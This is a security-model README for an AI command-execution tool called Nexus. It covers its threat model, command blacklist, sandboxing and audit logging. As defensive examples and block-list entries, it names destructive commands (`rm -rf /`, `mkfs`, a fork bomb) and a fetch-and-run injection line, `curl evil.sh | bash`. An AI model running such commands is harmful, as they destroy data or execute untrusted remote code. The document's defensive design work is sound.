# Nexus — Security Model

> Defence-in-depth architecture for AI-generated command execution.

---

## Threat Model

| Attack Surface | Threat | Defence |
|---|---|---|
| **LLM-generated commands** | AI hallucinates a destructive command (`rm -rf /`) | AST parser + blacklist hard-blocks it before any execution |
| **Shell injection** | Crafted input turns a simple command into `cmd; curl evil.sh \| bash` | `shell=True` only enabled when genuine pipeline operators detected; otherwise `shlex.split()` list is used |
| **Sudo privilege abuse** | Cached password reused across untrusted commands | Password stored as `bytearray`, zeroed byte-by-byte on auth failure; never a plain Python string |
| **Unseen command execution** | Agent runs commands user never approved | Mandatory user confirmation gate on every execution; every decision logged to `~/.nexus/audit.log` |
| **Audit evasion** | Attacker covers tracks by deleting session data | Audit log is separate from session (`audit.log` vs `session.json`), `chmod 600`, append-only via Python logging |
| **API key leakage** | Keys logged in debug output or stack traces | No debug prints in production paths; keys read from env/config, never echoed |
| **Path escape on file read/write** | LLM points `FILE_READ` or CLI `read` at another user's home via prefix tricks | `Path.resolve()` + `relative_to` allowlist (home + cwd), not `str.startswith` on `/home/user` |
| **FTP secrets on CLI** | Model suggests `ftp://user:pass@...` or `wget --ftp-password=` | Regex warnings in `CommandValidator`; **strict** validation blocks before execution |
| **Indefinite hangs** | Malformed command hangs the subprocess forever | Configurable timeout (default 120s) on all `subprocess.run` calls |
| **Cascading API failures** | All LLM fallbacks slammed simultaneously on rate-limit | Exponential backoff with jitter between fallback attempts |

## Security Components

### Command Validation (`security.py`)

- **AST-Based Analysis**: Deep analysis of shell syntax to catch obfuscated attacks (e.g. `eval`, `cd / && rm -rf *`).
- **Strict blacklist**: Blocks `rm -rf /`, `mkfs`, fork bombs `:(){ :|:& };:`.
- **`rm -rf /` heuristics**: Horizontal-whitespace-aware patterns so `/tmp/...`, `/var/tmp/...`, and wrapped lines are not false positives.
- **Path allowlist** (`SafetyCheck.is_path_within_any_root`): CLI `read`, orchestrator `FILE_READ`, and home-scoped `FILE_WRITE` require resolved paths to lie under **home** and/or **cwd** using `Path.relative_to`.
- **FTP strict mode**: Commands embedding passwords in `ftp://user:pass@...`, `wget --ftp-password=...`, `lftp -u user,pass`, or anonymous FTP forms are rejected.

### Command Execution (`executor.py`)

- **Scoped `shell=True`**: Only activates when genuine pipeline operators (`&&`, `|`, `;`, `>`) are detected — prevents injection when the command is a simple binary call.
- **Zeroized sudo password**: Stored as `bytearray` in memory and byte-by-byte zeroed on auth failure — never held as a Python `str` that GC might retain.
- **Mandatory confirmation** for dangerous or `sudo` operations.
- **Persistent Audit Log** (`~/.nexus/audit.log`, chmod 600): Every executed, skipped, or rejected command is logged with timestamp, return code, user-confirmed Y/N, and stdout/stderr excerpts.
- **Dry-run mode**: `JARVIS_DRY_RUN=1` prevents any command execution.

### Azure Sandboxing (`AZURE_RUN`)

User-controlled cloud sandbox powered by Azure Container Instances. Nexus flags commands that fetch or execute external code and gives an explicit choice:

- **Trigger keywords:** `git clone`, `wget`, `curl`, `bash -c`, `sh -c`, `tar -x`, `make install`, `./configure`
- **Transport**: All sandboxed commands are UTF-8 base64-encoded and piped through `base64 -d | bash` in the container — prevents quoting bugs.
- **Preflight**: Refuses obviously incomplete one-liners (empty, bare `git`/`curl`/`wget`).
- **Lifecycle**: Container provisioned, command executed, output streamed, container deleted.

### File Operations Security

- **FILE_READ**: Paths must resolve under home or cwd via `Path.relative_to` (not `str.startswith`).
- **FILE_WRITE**: Home-directory paths use Python `write_text` (no sudo); system paths use `sudo mkdir -p` + `sudo tee`.
- **FILE_SEARCH**: Shell injection prevented via `shlex.quote()`.

## Known Limitations

- Session file (`~/.nexus/session.json`) does not set `chmod 600` permissions. On multi-user machines, ensure proper home directory permissions (700). Fix is tracked in [FUTURE_SCOPE.md](FUTURE_SCOPE.md).

## Configuration

```bash
# Enable dry-run (no commands ever executed)
export JARVIS_DRY_RUN=1

# File locations
~/.nexus/audit.log      # Audit trail (chmod 600)
~/.nexus/session.json    # Session history
~/.config/nexus/config.json  # API keys + prefs (chmod 600)
```

---

*Updated: March 2026*
